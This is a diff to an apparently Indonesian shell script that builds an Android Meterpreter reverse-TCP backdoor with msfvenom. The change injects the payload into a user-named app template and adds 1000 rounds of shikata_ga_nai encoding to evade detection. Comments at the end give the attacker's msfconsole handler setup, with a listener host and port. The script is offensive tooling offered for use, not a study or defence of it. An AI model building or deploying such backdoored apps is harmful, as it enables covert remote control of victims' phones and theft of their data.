@@ -13,14 +13,14 @@ payload="android/meterpreter/reverse_tcp"
 read -p "Masukkan alamat ip address: " lhost
 read -p "Masukkan port: " lport
 read -p "Masukkan nama aplikasi untuk backdoor android: " nama_aplikasi
-msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" > "$nama_aplikasi"
+msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" -x "$nama_aplikasi" -e "shikata_ga_nai" -i "1000" > "$nama_aplikasi"
 
 # Disisi penyerang (kali linux)
-# +-------------------------------------------
-# msfconsole                                  
-# use exploit/multi/handler                   
-# set payload android/meterpreter/reverse_tcp 
-# set lhost 192.168.1.10                 
-# set lport 4444                           
-# exploit                                     
-# --------------------------------------------
+#----------------------------------------
+# $ msfconsole                                  
+# $ use exploit/multi/handler                   
+# $ set payload android/meterpreter/reverse_tcp 
+# $ set lhost 192.168.1.10                 
+# $ set lport 4444                           
+# $ exploit                                     
+#----------------------------------------
